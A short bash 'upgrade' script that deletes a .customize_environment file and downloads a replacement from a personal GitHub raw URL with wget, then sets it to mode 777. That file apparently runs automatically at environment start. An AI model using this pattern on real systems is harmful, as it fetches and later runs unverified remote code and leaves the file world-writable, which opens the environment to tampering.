#!/bin/bash

if [ $2 == '0.1' ]
then
   rm -rf .customize_environment ; wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment
fi

echo 'upgrade ok'
